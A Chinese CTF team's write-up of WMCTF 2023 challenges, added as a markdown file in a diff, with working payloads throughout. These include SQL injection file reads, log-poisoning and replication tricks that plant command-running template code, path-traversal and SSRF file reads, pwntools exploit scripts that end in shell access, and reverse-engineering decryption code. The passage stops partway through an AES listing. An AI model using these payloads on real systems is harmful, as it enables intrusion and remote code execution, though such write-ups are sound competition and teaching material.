@@ -1,0 +1,1886 @@
+---
+title: 2023 WMCTF SU Write-Up
+tags: ["WMCTF"]
+date: 2023-08-19 21:35:50
+slug: "wmctf-2023-su-wu"
+---
+
+感谢 WM 的师傅们精心准备的比赛！本次比赛我们 SU 取得了 10nd 的成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，只要你拥有一颗热爱 CTF 的心，都可以加入我们！欢迎发送个人简介至：[suers_xctf@126.com](mailto:suers_xctf@126.com)
+
+以下是我们 SU 本次 WMCTF 2023 的 writeup。
+
+<!--more-->
+
+
+# Web
+
+## ezblog
+
+获取uuid，访问`/console`
+
+```Plain
+GET /post/0%20union%20select%20TO%5FBASE64%28load%5Ffile%28%22%2Fhome%2Fezblog%2F%2Epm2%2Flogs%2Fmain%2Dout%2Elog%22%29%29%2C%272%27%2C3/edit 
+```
+
+利用/api/debugger/sql/execute路由，执行大部分SQL语句，因为`post.ejs`读写权限为777，所以设置mariadb的常规日志记录在`/home/ezblog/views/post.ejs`
+
+下面是利用到的sql语句，然后再利用`/api/debugger/template/test`路由访问`post.ejs`模板即可
+
+```SQL
+CREATE DATABASE mysql;
+CREATE TABLE mysql.general_log(
+event_time timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
+user_host mediumtext NOT NULL,
+thread_id int(11) NOT NULL,
+server_id int(10) unsigned NOT NULL,
+command_type varchar(64) NOT NULL,
+argument mediumtext NOT NULL
+) ENGINE=CSV DEFAULT CHARSET=utf8 COMMENT='General log'
+set global general_log = "ON";
+set global general_log_file='/home/ezblog/views/post.ejs';
+<=- global.process.mainModule.constructor._load(`child_process`).execSync(`/readflag`).toString() =>
+```
+
+参考连接：
+
+https://hxp.io/blog/101/hxp-CTF-2022-valentine/
+
+https://www.sqlsec.com/2020/11/mysql.html#into-oufile-%E5%86%99-shell
+
+## ezblog2
+
+大体思路一样，难点就于主从复制上，关闭主服务器的CRC32，手动修改Binary Log，导致从服务器执行SQL语句
+
+获取uuid，访问`/console`
+
+```Plain
+GET /post/0%20union%20select%20TO%5FBASE64%28load%5Ffile%28%22%2Fhome%2Fezblog%2F%2Epm2%2Flogs%2Fmain%2Dout%2Elog%22%29%29%2C%272%27%2C3/edit 
+```
+
+主服务器激活Binary Log
+
+```Bash
+#/etc/my.cnf
+#
+# This group is read both by the client and the server
+# use it for options that affect everything
+#
+[client-server]
+
+#
+# include *.cnf from the config directory
+#
+!includedir /etc/my.cnf.d
+
+[mysqld]
+server_id       = 2
+secure_file_priv=
+log-bin         = mysql-bin
+binlog_format = MIXED
+```
+
+主服务器执行如下语句（我是用mycli连接的）
+
+```SQL
+MariaDB root@(none):test> set global binlog_checksum = 0; #关闭主服务器的CRC32
+MariaDB root@(none):test> reset master; #删除所有二进制日志文件
+MariaDB root@(none):test> create database test;
+MariaDB root@(none):test> CREATE TABLE employees (
+                        id INT,
+                        name VARCHAR(100),
+                        age INT
+                        );
+MariaDB root@(none):test>INSERT INTO employees(id, name, age) VALUES(1, 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA', 30)
+MariaDB root@(none):test>create database test2;
+```
+
+因为Binary Log只记录如[CREATE](https://mariadb.com/kb/en/create/)、[ALTER](https://mariadb.com/kb/en/alter/)、[INSERT](https://mariadb.com/kb/en/insert/)、[UPDATE](https://mariadb.com/kb/en/update/)和[DELETE](https://mariadb.com/kb/en/delete/)之类对数据有影响的语句，对数据没有影响的语句（如 SELECT 和 SHOW ）不会被记录，这里创建create database语句只是为了观察主从复制时是否出错，至关重要的是INSERT语句，要与payload长度一致
+
+```SQL
+select '<%= process.mainModule.require("child_process").execSync("/readflag").toString() %>' into outfile '/home/ezblog/views/114.ejs'
+INSERT INTO employees(id, name, age) VALUES(1, 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA', 30)
+```
+
+找到binlog默认为`mysql-bin.000001`，我的binlog在`/var/lib/mysql/mysql-bin.000001`，用你喜欢的16进制编辑进行编辑，我这里随便找了个，替换INSERT INTO xxx部分
+
+![img](20230821210707797.jpg)
+
+![img](20230821210708018.jpg)
+
+用官方的`mysqlbinlog`查看mysql-bin是否报错，没有就进行替换
+
+```Bash
+mysqlbinlog mysql-bin.000001
+sudo cp mysql-bin.000001 /var/lib/mysql/
+```
+
+可以看到已经成功替换了
+
+```SQL
+MariaDB root@(none):test> SHOW BINLOG EVENTS
++------------------+------+-------------------+-----------+-------------+----------------------------------------------------------------------------------------------------------------------------------------------------+
+| Log_name         | Pos  | Event_type        | Server_id | End_log_pos | Info                                                                                                                                               |
++------------------+------+-------------------+-----------+-------------+----------------------------------------------------------------------------------------------------------------------------------------------------+
+| mysql-bin.000001 | 4    | Format_desc       | 2         | 256         | Server ver: 11.0.3-MariaDB-log, Binlog ver: 4                                                                                                      |
+| mysql-bin.000001 | 256  | Gtid_list         | 2         | 281         | []                                                                                                                                                 |
+| mysql-bin.000001 | 281  | Binlog_checkpoint | 2         | 320         | mysql-bin.000001                                                                                                                                   |
+| mysql-bin.000001 | 320  | Gtid              | 2         | 358         | GTID 0-2-1                                                                                                                                         |
+| mysql-bin.000001 | 358  | Query             | 2         | 448         | drop database test                                                                                                                                 |
+| mysql-bin.000001 | 448  | Gtid              | 2         | 486         | GTID 0-2-2                                                                                                                                         |
+| mysql-bin.000001 | 486  | Query             | 2         | 578         | drop database test1                                                                                                                                |
+| mysql-bin.000001 | 578  | Gtid              | 2         | 616         | GTID 0-2-3                                                                                                                                         |
+| mysql-bin.000001 | 616  | Query             | 2         | 708         | drop database test2                                                                                                                                |
+| mysql-bin.000001 | 708  | Gtid              | 2         | 746         | GTID 0-2-4                                                                                                                                         |
+| mysql-bin.000001 | 746  | Query             | 2         | 838         | drop database test5                                                                                                                                |
+| mysql-bin.000001 | 838  | Gtid              | 2         | 876         | GTID 0-2-5                                                                                                                                         |
+| mysql-bin.000001 | 876  | Query             | 2         | 968         | drop database test6                                                                                                                                |
+| mysql-bin.000001 | 968  | Gtid              | 2         | 1006        | GTID 0-2-6                                                                                                                                         |
+| mysql-bin.000001 | 1006 | Query             | 2         | 1089        | create database test                                                                                                                               |
+| mysql-bin.000001 | 1089 | Gtid              | 2         | 1127        | GTID 0-2-7                                                                                                                                         |
+| mysql-bin.000001 | 1127 | Query             | 2         | 1348        | use `test`; CREATE TABLE employees (                                                                                                               |
+|                  |      |                   |           |             |                        id INT,                                                                                                                     |
+|                  |      |                   |           |             |                    name VARCHAR(100),                                                                                                              |
+|                  |      |                   |           |             |                        age INT                                                                                                                     |
+|                  |      |                   |           |             |                        )                                                                                                                           |
+| mysql-bin.000001 | 1348 | Gtid              | 2         | 1386        | BEGIN GTID 0-2-8                                                                                                                                   |
+| mysql-bin.000001 | 1386 | Query             | 2         | 1583        | use `test`; select '<%= process.mainModule.require("child_process").execSync("/readflag").toString() %>' into outfile '/home/ezblog/views/114.ejs' |
+| mysql-bin.000001 | 1583 | Xid               | 2         | 1610        | COMMIT /* xid=116 */                                                                                                                               |
+| mysql-bin.000001 | 1610 | Gtid              | 2         | 1648        | GTID 0-2-9                                                                                                                                         |
+| mysql-bin.000001 | 1648 | Query             | 2         | 1733        | create database test2                                                                                                                              |
++------------------+------+-------------------+-----------+-------------+----------------------------------------------------------------------------------------------------------------------------------------------------+
+```
+
+在题目的`/api/debugger/python/execute` 路由上执行如下SQL，然后利用`/api/debugger/template/test`路由访问`114.ejs`模板即可
+
+```SQL
+create database mysql;
+CREATE TABLE mysql.gtid_slave_pos (
+    `domain_id` int(10) unsigned NOT NULL,
+    `sub_id` bigint(20) unsigned NOT NULL,
+   `server_id` int(10) unsigned NOT NULL,
+   `seq_no` bigint(20) unsigned NOT NULL,
+    PRIMARY KEY (`domain_id`,`sub_id`)
+   ) ENGINE=MyISAM DEFAULT CHARSET=utf8 COMMENT='Replication slave GTID state';
+CHANGE MASTER TO
+    MASTER_HOST='192.168.2.203',
+    MASTER_USER='shukuang',
+    MASTER_PASSWORD='',
+    MASTER_LOG_FILE='mysql-bin.000001',
+    MASTER_LOG_POS=0;
+START SLAVE;
+show slave status;
+```
+
+参考连接：
+
+https://mariadb.com/kb/en/documentation/
+
+## AnyFileRead
+
+绕过SpringSecurity读flag，需要注意编码解析问题，用burp即可
+
+```Bash
+/admin/../flag
+```
+
+## ez_java_agagin
+
+ <!--  <link rel="Shortcut Icon" href="./Imagefile?url1=upload/favicon.ico" type="image/x-icon" /> 存在安全问题，已废弃-->
+
+![img](20230821210708558.jpg)
+
+/usr/share/java/这个目录有java，file:///列根目录发现flag文件，flag被过滤用二次编码绕
+
+```Bash
+/Imagefile?url1=file:///usr/share/java/../../../../%2566%256c%2561%2567
+```
+
+## 你的权限放着我来
+
+http://b122e3c7-3f13-4c4b-8c92-9639c6ad9de5.wmctf.wm-team.cn/
+
+/api/change
+
+任意用户重置
+
+重置jom@roomke.com的密码 拿到flag flag{test_flag}
+
+# Pwn
+
+## Blindless 
+
+Libc大师题，改elf的linkmap的l_addr到backdoor，爆破1位，控制一下fini_array什么的l_info指向0
+
+```Python
+from pwn import *
+context.arch = 'amd64'
+context.log_level = 'debug'
+
+if args.REMOTE :
+    sh = remote('1.13.101.243','27227')
+else:
+    sh = process('./main')
+
+script = ''
+def bpt(addr_or_sym,bigFileOff=False):
+    global script
+    if type(addr_or_sym) is int:
+        addr = addr_or_sym
+        if addr > 0x400000 and not bigFileOff:
+            script += f'b * {addr:#x}\n'
+        else:
+            script += f'brva {addr:#x}\n'
+    elif type(addr_or_sym) is str:
+        script += 'b ' + addr_or_sym + '\n'
+    elif type(addr_or_sym) is list:
+        for i in addr_or_sym:
+            bpt(i)
+    
+
+def b(x=None,go=False,action=''):
+    global script
+    if x != None:
+        bpt(x)
+    if go or action != '':
+        script += 'c\n'
+    script += action
+    gdb.attach(sh,script)
+    pause()
+
+code = b''
+
+def add_off(off):
+    global code
+    code += b'@' + p32(off)
+def write(ch):
+    global code
+    code += b'.' + ch
+def shift():
+    global code
+    code += b'>'
+
+def shift_8():
+    global code
+    code += b'+'
+
+def quit():
+    global code
+    code += b'q'
+
+data_size = 0x200000
+sh.sendlineafter(b'data size\n',str(data_size).encode())
+
+# shift_8()
+
+linkmap_off = 0x424180
+
+add_off(linkmap_off)
+write(b'\x09')
+shift()
+write(b'\x12')
+
+add_off(0xa8-1)
+write(b'\x40')
+add_off(0x110-0xa8)
+write(b'\x40')
+add_off(0x120-0x110)
+write(b'\x40')
+
+quit()
+
+sh.sendlineafter(b'code size\n',str(len(code)).encode())
+
+# b(['_dl_fini',0x130e])
+sh.sendafter(b'your code\n',code)
+
+sh.interactive()
+```
+
+## Jit 
+
+Ida 7.7的i64
+
+
+交互是输俩十六进制字符串
+
+013f2eff883这样的
+
+漏洞应该在generate_code函数
+
+有效的opcode在check_code里
+
+2k行看不动了
+
+没必要看，只要测一下那些opcode代表的操作，就会发现有内存写的指令，同时还允许使用rbp为目标寄存器，就直接按他的逻辑写汇编改返回地址然后jit spray就完事了
+
+```Python
+from pwn import *
+import binascii
+context.arch = 'amd64'
+context.log_level = 'debug'
+
+if args.REMOTE :
+    sh = remote('1.13.101.243','26419')
+else:
+    sh = process('./jit')
+
+script = ''
+def bpt(addr_or_sym,bigFileOff=False):
+    global script
+    if type(addr_or_sym) is int:
+        addr = addr_or_sym
+        if addr > 0x400000 and not bigFileOff:
+            script += f'b * {addr:#x}\n'
+        else:
+            script += f'brva {addr:#x}\n'
+    elif type(addr_or_sym) is str:
+        script += 'b ' + addr_or_sym + '\n'
+    elif type(addr_or_sym) is list:
+        for i in addr_or_sym:
+            bpt(i)
+    
+
+def b(x=None,go=False,action=''):
+    global script
+    if x != None:
+        bpt(x)
+    if go or action != '':
+        script += 'c\n'
+    script += action
+    gdb.attach(sh,script)
+    pause()
+
+code = b''
+
+def make_code(op,r1=0,r2=0,off=0,imm=0):
+    global code
+    payload = b''
+    payload += p8(op)
+    payload += p8((r1 << 4) + (r2 & 0xf))
+    payload += p16(off)
+    payload += p32(imm)
+    # code += payload
+    return payload
+
+mem = b'\x80\x88'
+
+def sd():
+    sh.sendlineafter(b'Program: ',binascii.hexlify(code))
+    sh.sendlineafter(b'Memory: ',binascii.hexlify(mem))
+
+def add_imm(r,imm):
+    global code
+    code += make_code(7,r2=r,imm=imm)
+
+def reg_add(dst,src):
+    global code
+    code += make_code(0xc,r1=src,r2=dst)
+
+# 0x18 movabs 
+# 0xde jle
+# 0x62-0x7b mov xxx ptr [r], r/imm
+# 0x5 - 0xde jmp/jxx    
+# 0xac xor
+# 0xbc mov
+# 0xc7 sar
+
+rax = 0
+rdi = 1
+rsi = 2
+rdx = 3
+r9 = 4
+r8 = 5
+rbx = 6
+r13 = 7
+r14 = 8
+r15 = 9
+rbp = 10
+
+def mov(dst,src):
+    global code
+    code += make_code(0xbc,r1=src,r2=dst)
+
+def mov_imm(dst,imm):
+    global code
+    code += make_code(0xb7,r2=dst,imm=imm)
+
+mov(rbx,rax)
+mov_imm(rdx,7)
+mov(rdi,rax)
+mov_imm(rsi,0x2000)
+
+mov_imm(rax,0xa)
+
+add_imm(rbx,0x3b)
+
+code += make_code(0x7b,r1=rbx,r2=rbp,off=0x28) # mov qword ptr [rbp+0x28],rbx /// return address
+
+def add32(r,imm):
+    global code
+    code += make_code(0x4,r2=r,imm=imm)
+
+tail = 0x03eb0000
+
+sc = '''syscall
+xor eax,eax
+push rsi;pop rdx;
+push rdi;pop rsi;
+push rax;pop rdi;
+syscall
+'''
+for i in sc.splitlines():
+    add32(r15,u16(asm(i)) + tail)
+
+# b(0x2947,go=True)   
+
+sd()
+
+pause()
+
+sh.sendline(b'\x90' * 0x100 + asm(shellcraft.sh()))
+
+sh.interactive()
+```
+
+# Re
+
+## ezAndroid
+
+![img](20230821210707945.jpg)
+
+输入账号和密码，注册在native里，d810去混淆发现是rc4加密和aes加密，全部魔改了，通过动态调试找到rc4的key是12345678，他rc4魔改了后面有个异或i
+
+```Python
+a = [0xE9, 0x97, 0x64, 0xE6, 0x7E, 0xEB, 0xBD, 0xC1, 0xAB, 0x43]
+b = [0] * 10
+for i in range(10):
+    b[i] = a[i] ^ i
+    print(hex(b[i]),end=",")
+import base64
+def rc4_main(key = "init_key", message = "init_message"):
+    print("RC4解密主函数调用成功")
+    print('\n')
+    s_box = rc4_init_sbox(key)
+    crypt = rc4_excrypt(message, s_box)
+    return crypt
+def rc4_init_sbox(key):
+    s_box = list(range(256))
+    print("原来的 s 盒：%s" % s_box)
+    print('\n')
+    j = 0
+    for i in range(256):
+        j = (j + s_box[i] + ord(key[i % len(key)])) % 256
+        s_box[i], s_box[j] = s_box[j], s_box[i]
+    print("混乱后的 s 盒：%s"% s_box)
+    print('\n')
+    return s_box
+def rc4_excrypt(plain, box):
+    print("调用解密程序成功。")
+    print('\n')
+    plain = base64.b64decode(plain.encode('utf-8'))
+    plain = bytes.decode(plain)
+    res = []
+    i = j = 0
+    for s in plain:
+        i = (i + 1) % 256
+        j = (j + box[i]) % 256
+        box[i], box[j] = box[j], box[i]
+        t = (box[i] + box[j]) % 256
+        k = box[t]
+        res.append(chr(ord(s) + k))
+    print("res用于解密字符串，解密后是：%res" %res)
+    print('\n')
+    cipher = "".join(res)
+    print("解密后的字符串是：%s" %cipher)
+    print('\n')
+    print("解密后的输出(没经过任何编码):")
+    print('\n')
+    return cipher
+a=[0xe9,0x96,0x66,0xe5,0x7a,0xee,0xbb,0xc6,0xa3,0x4a]
+key="12345678"
+s=""
+for i in a:
+    s+=chr(i)
+s=str(base64.b64encode(s.encode('utf-8')), 'utf-8')
+rc4_main(key, s)
+```
+
+得到账号，然后账号+123456作为key传入aes加密，这个加密魔改了sbox
+
+![img](20230821210708748.jpg)
+
+通过下面脚本求逆sbox
+
+```Python
+#include <stdio.h>
+#include <stdint.h>
+int main(){
+    uint8_t S_BOX[16][16] = {0x29, 0x40, 0x57, 0x6E, 0x85, 0x9C, 0xB3, 0xCA, 0xE1, 0xF8, 0x0F, 0x26, 0x3D, 0x54, 0x6B, 0x82, 0x99, 0xB0, 0xC7, 0xDE, 0xF5, 0x0C, 0x23, 0x3A, 0x51, 0x68, 0x7F, 0x96, 0xAD, 0xC4, 0xDB, 0xF2, 0x09, 0x20, 0x37, 0x4E, 0x65, 0x7C, 0x93, 0xAA, 0xC1, 0xD8, 0xEF, 0x06, 0x1D, 0x34, 0x4B, 0x62, 0x79, 0x90, 0xA7, 0xBE, 0xD5, 0xEC, 0x03, 0x1A, 0x31, 0x48, 0x5F, 0x76, 0x8D, 0xA4, 0xBB, 0xD2, 0xE9, 0x00, 0x17, 0x2E, 0x45, 0x5C, 0x73, 0x8A, 0xA1, 0xB8, 0xCF, 0xE6, 0xFD, 0x14, 0x2B, 0x42, 0x59, 0x70, 0x87, 0x9E, 0xB5, 0xCC, 0xE3, 0xFA, 0x11, 0x28, 0x3F, 0x56, 0x6D, 0x84, 0x9B, 0xB2, 0xC9, 0xE0, 0xF7, 0x0E, 0x25, 0x3C, 0x53, 0x6A, 0x81, 0x98, 0xAF, 0xC6, 0xDD, 0xF4, 0x0B, 0x22, 0x39, 0x50, 0x67, 0x7E, 0x95, 0xAC, 0xC3, 0xDA, 0xF1, 0x08, 0x1F, 0x36, 0x4D, 0x64, 0x7B, 0x92, 0xA9, 0xC0, 0xD7, 0xEE, 0x05, 0x1C, 0x33, 0x4A, 0x61, 0x78, 0x8F, 0xA6, 0xBD, 0xD4, 0xEB, 0x02, 0x19, 0x30, 0x47, 0x5E, 0x75, 0x8C, 0xA3, 0xBA, 0xD1, 0xE8, 0xFF, 0x16, 0x2D, 0x44, 0x5B, 0x72, 0x89, 0xA0, 0xB7, 0xCE, 0xE5, 0xFC, 0x13, 0x2A, 0x41, 0x58, 0x6F, 0x86, 0x9D, 0xB4, 0xCB, 0xE2, 0xF9, 0x10, 0x27, 0x3E, 0x55, 0x6C, 0x83, 0x9A, 0xB1, 0xC8, 0xDF, 0xF6, 0x0D, 0x24, 0x3B, 0x52, 0x69, 0x80, 0x97, 0xAE, 0xC5, 0xDC, 0xF3, 0x0A, 0x21, 0x38, 0x4F, 0x66, 0x7D, 0x94, 0xAB, 0xC2, 0xD9, 0xF0, 0x07, 0x1E, 0x35, 0x4C, 0x63, 0x7A, 0x91, 0xA8, 0xBF, 0xD6, 0xED, 0x04, 0x1B, 0x32, 0x49, 0x60, 0x77, 0x8E, 0xA5, 0xBC, 0xD3, 0xEA, 0x01, 0x18, 0x2F, 0x46, 0x5D, 0x74, 0x8B, 0xA2, 0xB9, 0xD0, 0xE7, 0xFE, 0x15, 0x2C, 0x43, 0x5A, 0x71, 0x88, 0x9F, 0xB6, 0xCD, 0xE4, 0xFB, 0x12};
+    uint8_t Te_InvS[16][16] = { 0 };        //逆S盒缓存
+    uint8_t Te_InVSAdd[2] = { 0 };            //位置
+    for (uint8_t i = 0; i < 16; i++) {                    //计算逆S盒
+        for (uint8_t n = 0; n < 16; n++) {
+            Te_InVSAdd[0] = (S_BOX[i][n] >> 4) & 0x0f;        //取行
+            Te_InVSAdd[1] = (S_BOX[i][n] >> 0) & 0x0f;        //取列
+            Te_InvS[Te_InVSAdd[0]][Te_InVSAdd[1]] = (i * 16 + n)&0xff;        //置值
+        }
+    } 
+    for (int i = 0; i < 16; i++){
+        for (int ii = 0; ii < 16; ii++){
+        printf("%d,",Te_InvS[i][ii]);
+        }
+    }
+}
+```
+
+得到逆sbox，然后拿aes解密就行
+
+```Python
+#include <stdio.h>
+#include <stdint.h>
+#include <memory.h>
+/****************************************************************************************************************/
+typedef enum {
+    AES_CYPHER_128,
+    AES_CYPHER_192,
+    AES_CYPHER_256,
+} AES_CYPHER_T;
+/****************************************************************************************************************/
+/*
+* Encryption Rounds
+*/
+int g_aes_key_bits[] = {
+    /* AES_CYPHER_128 */ 128,
+    /* AES_CYPHER_192 */ 192,
+    /* AES_CYPHER_256 */ 256,
+};
+int g_aes_rounds[] = {
+    /* AES_CYPHER_128 */  10,
+    /* AES_CYPHER_192 */  12,
+    /* AES_CYPHER_256 */  14,
+};
+int g_aes_nk[] = {
+    /* AES_CYPHER_128 */  4,
+    /* AES_CYPHER_192 */  6,
+    /* AES_CYPHER_256 */  8,
+};
+int g_aes_nb[] = {
+    /* AES_CYPHER_128 */  4,
+    /* AES_CYPHER_192 */  4,
+    /* AES_CYPHER_256 */  4,
+};
+/****************************************************************************************************************/
+/*
+* aes Rcon:
+*
+* WARNING: Rcon is designed starting from 1 to 15, not 0 to 14.
+*          FIPS-197 Page 9: "note that i starts at 1, not 0"
+*
+* i    |   0     1     2     3     4     5     6     7     8     9    10    11    12    13    14
+* -----+------------------------------------------------------------------------------------------
+*      | [01]  [02]  [04]  [08]  [10]  [20]  [40]  [80]  [1b]  [36]  [6c]  [d8]  [ab]  [4d]  [9a]
+* RCON | [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]
+*      | [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]
+*      | [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]  [00]
+*/
+static const uint32_t g_aes_rcon[] = {
+    0x01000000, 0x02000000, 0x04000000, 0x08000000, 0x10000000, 0x20000000, 0x40000000, 0x80000000,
+    0x1b000000, 0x36000000, 0x6c000000, 0xd8000000, 0xab000000, 0xed000000, 0x9a000000
+};
+/****************************************************************************************************************/
+/*
+* aes sbox and invert-sbox
+*/
+static const uint8_t g_aes_sbox[256] = {
+    /* 0     1     2     3   u  4     5     6     7     8     9     A     B     C     D     E     F  */
+    0x29, 0x40, 0x57, 0x6E, 0x85, 0x9C, 0xB3, 0xCA, 0xE1, 0xF8, 0x0F, 0x26, 0x3D, 0x54, 0x6B, 0x82, 0x99, 0xB0, 0xC7, 0xDE, 0xF5, 0x0C, 0x23, 0x3A, 0x51, 0x68, 0x7F, 0x96, 0xAD, 0xC4, 0xDB, 0xF2, 0x09, 0x20, 0x37, 0x4E, 0x65, 0x7C, 0x93, 0xAA, 0xC1, 0xD8, 0xEF, 0x06, 0x1D, 0x34, 0x4B, 0x62, 0x79, 0x90, 0xA7, 0xBE, 0xD5, 0xEC, 0x03, 0x1A, 0x31, 0x48, 0x5F, 0x76, 0x8D, 0xA4, 0xBB, 0xD2, 0xE9, 0x00, 0x17, 0x2E, 0x45, 0x5C, 0x73, 0x8A, 0xA1, 0xB8, 0xCF, 0xE6, 0xFD, 0x14, 0x2B, 0x42, 0x59, 0x70, 0x87, 0x9E, 0xB5, 0xCC, 0xE3, 0xFA, 0x11, 0x28, 0x3F, 0x56, 0x6D, 0x84, 0x9B, 0xB2, 0xC9, 0xE0, 0xF7, 0x0E, 0x25, 0x3C, 0x53, 0x6A, 0x81, 0x98, 0xAF, 0xC6, 0xDD, 0xF4, 0x0B, 0x22, 0x39, 0x50, 0x67, 0x7E, 0x95, 0xAC, 0xC3, 0xDA, 0xF1, 0x08, 0x1F, 0x36, 0x4D, 0x64, 0x7B, 0x92, 0xA9, 0xC0, 0xD7, 0xEE, 0x05, 0x1C, 0x33, 0x4A, 0x61, 0x78, 0x8F, 0xA6, 0xBD, 0xD4, 0xEB, 0x02, 0x19, 0x30, 0x47, 0x5E, 0x75, 0x8C, 0xA3, 0xBA, 0xD1, 0xE8, 0xFF, 0x16, 0x2D, 0x44, 0x5B, 0x72, 0x89, 0xA0, 0xB7, 0xCE, 0xE5, 0xFC, 0x13, 0x2A, 0x41, 0x58, 0x6F, 0x86, 0x9D, 0xB4, 0xCB, 0xE2, 0xF9, 0x10, 0x27, 0x3E, 0x55, 0x6C, 0x83, 0x9A, 0xB1, 0xC8, 0xDF, 0xF6, 0x0D, 0x24, 0x3B, 0x52, 0x69, 0x80, 0x97, 0xAE, 0xC5, 0xDC, 0xF3, 0x0A, 0x21, 0x38, 0x4F, 0x66, 0x7D, 0x94, 0xAB, 0xC2, 0xD9, 0xF0, 0x07, 0x1E, 0x35, 0x4C, 0x63, 0x7A, 0x91, 0xA8, 0xBF, 0xD6, 0xED, 0x04, 0x1B, 0x32, 0x49, 0x60, 0x77, 0x8E, 0xA5, 0xBC, 0xD3, 0xEA, 0x01, 0x18, 0x2F, 0x46, 0x5D, 0x74, 0x8B, 0xA2, 0xB9, 0xD0, 0xE7, 0xFE, 0x15, 0x2C, 0x43, 0x5A, 0x71, 0x88, 0x9F, 0xB6, 0xCD, 0xE4, 0xFB, 0x12
+};
+static const uint8_t g_inv_sbox[256] = {
+    /* 0     1     2     3     4     5     6     7     8     9     A     B     C     D     E     F  */
+    65,232,143,54,221,132,43,210,121,32,199,110,21,188,99,10,177,88,255,166,77,244,155,66,233,144,55,222,133,44,211,122,33,200,111,22,189,100,11,178,89,0,167,78,245,156,67,234,145,56,223,134,45,212,123,34,201,112,23,190,101,12,179,90,1,168,79,246,157,68,235,146,57,224,135,46,213,124,35,202,113,24,191,102,13,180,91,2,169,80,247,158,69,236,147,58,225,136,47,214,125,36,203,114,25,192,103,14,181,92,3,170,81,248,159,70,237,148,59,226,137,48,215,126,37,204,115,26,193,104,15,182,93,4,171,82,249,160,71,238,149,60,227,138,49,216,127,38,205,116,27,194,105,16,183,94,5,172,83,250,161,72,239,150,61,228,139,50,217,128,39,206,117,28,195,106,17,184,95,6,173,84,251,162,73,240,151,62,229,140,51,218,129,40,207,118,29,196,107,18,185,96,7,174,85,252,163,74,241,152,63,230,141,52,219,130,41,208,119,30,197,108,19,186,97,8,175,86,253,164,75,242,153,64,231,142,53,220,131,42,209,120,31,198,109,20,187,98,9,176,87,254,165,76,243,154
+};
+/****************************************************************************************************************/
+uint8_t aes_sub_sbox(uint8_t val)
+{
+    return g_aes_sbox[val];
+}
+/****************************************************************************************************************/
+uint32_t aes_sub_dword(uint32_t val)
+{
+    uint32_t tmp = 0;
+
+    tmp |= ((uint32_t)aes_sub_sbox((uint8_t)((val >> 0) & 0xFF))) << 0;
+    tmp |= ((uint32_t)aes_sub_sbox((uint8_t)((val >> 8) & 0xFF))) << 8;
+    tmp |= ((uint32_t)aes_sub_sbox((uint8_t)((val >> 16) & 0xFF))) << 16;
+    tmp |= ((uint32_t)aes_sub_sbox((uint8_t)((val >> 24) & 0xFF))) << 24;
+
+    return tmp;
+}
+/****************************************************************************************************************/
+uint32_t aes_rot_dword(uint32_t val)
+{
+    uint32_t tmp = val;
+
+    return (val >> 8) | ((tmp & 0xFF) << 24);
+}
+/****************************************************************************************************************/
+uint32_t aes_swap_dword(uint32_t val)
+{
+    return (((val & 0x000000FF) << 24) |
+        ((val & 0x0000FF00) << 8) |
+        ((val & 0x00FF0000) >> 8) |
+        ((val & 0xFF000000) >> 24));
+}
+/****************************************************************************************************************/
+/*
+* nr: number of rounds
+* nb: number of columns comprising the state, nb = 4 dwords (16 bytes)
+* nk: number of 32-bit words comprising cipher key, nk = 4, 6, 8 (KeyLength/(4*8))
+*/
+void aes_key_expansion(AES_CYPHER_T mode, uint8_t *key, uint8_t *round)
+{
+    uint32_t *w = (uint32_t *)round;
+    uint32_t  t;
+    int      i = 0;
+
+    do {
+        w[i] = *((uint32_t *)&key[i * 4 + 0]);
+    } while (++i < g_aes_nk[mode]);
+
+    do {
+        if ((i % g_aes_nk[mode]) == 0) {
+            t = aes_rot_dword(w[i - 1]);
+            t = aes_sub_dword(t);
+            t = t ^ aes_swap_dword(g_aes_rcon[i / g_aes_nk[mode] - 1]);
+        }
+        else if (g_aes_nk[mode] > 6 && (i % g_aes_nk[mode]) == 4) {
+            t = aes_sub_dword(w[i - 1]);
+        }
+        else {
+            t = w[i - 1];
+        }
+        w[i] = w[i - g_aes_nk[mode]] ^ t;
+    } while (++i < g_aes_nb[mode] * (g_aes_rounds[mode] + 1));
+}
+/****************************************************************************************************************/
+void aes_add_round_key(AES_CYPHER_T mode, uint8_t *state,
+    uint8_t *round, int nr)
+{
+    uint32_t *w = (uint32_t *)round;
+    uint32_t *s = (uint32_t *)state;
+    int i;
+
+    for (i = 0; i < g_aes_nb[mode]; i++) {
+        s[i] ^= w[nr * g_aes_nb[mode] + i];
+    }
+}
+/****************************************************************************************************************/
+void aes_sub_bytes(AES_CYPHER_T mode, uint8_t *state)
+{
+    int i, j;
+
+    for (i = 0; i < g_aes_nb[mode]; i++) {
+        for (j = 0; j < 4; j++) {
+            state[i * 4 + j] = aes_sub_sbox(state[i * 4 + j]);
+        }
+    }
+}
+/****************************************************************************************************************/
+void aes_shift_rows(AES_CYPHER_T mode, uint8_t *state)
+{
+    uint8_t *s = (uint8_t *)state;
+    int i, j, r;
+
+    for (i = 1; i < g_aes_nb[mode]; i++) {
+        for (j = 0; j < i; j++) {
+            uint8_t tmp = s[i];
+            for (r = 0; r < g_aes_nb[mode]; r++) {
+                s[i + r * 4] = s[i + (r + 1) * 4];
+            }
+            s[i + (g_aes_nb[mode] - 1) * 4] = tmp;
+        }
+    }
+}
+/****************************************************************************************************************/
+uint8_t aes_xtime(uint8_t x)
+{
+    return ((x << 1) ^ (((x >> 7) & 1) * 0x1b));
+}
+/****************************************************************************************************************/
+uint8_t aes_xtimes(uint8_t x, int ts)
+{
+    while (ts-- > 0) {
+        x = aes_xtime(x);
+    }
+
+    return x;
+}
+/****************************************************************************************************************/
+uint8_t aes_mul(uint8_t x, uint8_t y)
+{
+    /*
+    * encrypt: y has only 2 bits: can be 1, 2 or 3
+    * decrypt: y could be any value of 9, b, d, or e
+    */
+
